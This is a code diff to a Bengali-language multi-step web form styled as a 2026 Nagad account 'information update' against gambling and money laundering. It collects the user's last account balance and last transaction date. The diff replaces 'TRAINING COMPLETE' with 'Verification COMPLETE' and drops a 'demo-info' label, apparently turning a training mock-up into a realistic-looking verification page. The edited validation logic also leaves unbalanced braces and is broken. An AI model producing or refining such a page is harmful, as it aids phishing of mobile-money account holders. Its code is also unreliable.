@@ -94,35 +94,38 @@ back.addEventListener("click", function () {
 next.addEventListener("click", function () {
   const step = steps[currentStep];
   
-  if (currentStep === 0 || currentStep === 1) {
-    const date = document.getElementById("date");
-    const balance = document.getElementById("balance");
+// Last Account Balance
+if (currentStep === 0 || currentStep === 1) {
+  const input = document.getElementById("Input");
 
+  if (!input || !input.value.trim()) {
+    message.textContent = "তথ্য লিখুন।";
+    return;
+  }
+}
 
-    if (!date.value || !balance.value.trim()) {
-      message.textContent = "তথ্য লিখুন।";
-      return;
-    }
-  } 
-   if (step.html) {
-    const date = document.getElementById("date");
-    const balance = document.getElementById("balance");
+// Last Transaction Date
+if (currentStep === 2) {
+  const date = document.getElementById("date");
+  const balance = document.getElementById("balance");
 
-    if (!input || input.value.trim() === "") {
-      message.textContent = "তথ্য লিখুন।";
-      return;
+  if (!date || !balance || !date.value || !balance.value.trim()) {
+    message.textContent = "তথ্য পূরণ করুন।";
+    return;
+  }
+}
     }
        }
     if (currentStep < steps.length - 1) {
     currentStep++;
     showStep();
  } else {
-    progress.textContent = "TRAINING COMPLETE";
+    progress.textContent = "Verification COMPLETE";
     progressBar.style.width = "100%";
     title.textContent = "অনলাইন জুয়া এবং মানি লন্ডারিং প্রতিরোধে নগদ তথ্য হালনাগাদ 2026";
 
     content.innerHTML = `
-      <div class="demo-info">তথ্য হালনাগাদ প্রক্রিয়ার সফল হয়েছে।</div>
+      <div class="info">তথ্য হালনাগাদ প্রক্রিয়ার সফল হয়েছে।</div>
       <p>
         কখনো কোনো ব্যক্তির কাছে
         নিজের আসল PIN, পাসওয়ার্ড বা OTP দেবেন না।
